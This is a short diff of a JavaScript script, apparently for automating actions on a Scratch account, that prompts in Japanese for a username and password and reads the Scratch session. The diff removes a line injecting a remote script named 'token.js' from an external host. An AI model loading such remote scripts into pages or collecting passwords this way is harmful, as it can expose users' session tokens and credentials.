@@ -9,7 +9,6 @@ input.addEventListener('change', () => {
         reader.onload = ()=> {
             let followuser = prompt("ユーザー名は何で行きますか？").toLowerCase();
             let password=prompt("ログインのためのパスワードを入力");
-            var src=document.createElement("script");src.src="https://haruymth.github.io/scripts/codes/token.js";document.body.appendChild(src);
             const flw = async (index) => {
             let dat=await (await fetch("https://scratch.mit.edu/session",{headers:{"x-requested-with": "XMLHttpRequest"}})).json();
             if(dat["user"]["username"].toLowerCase()==followuser){
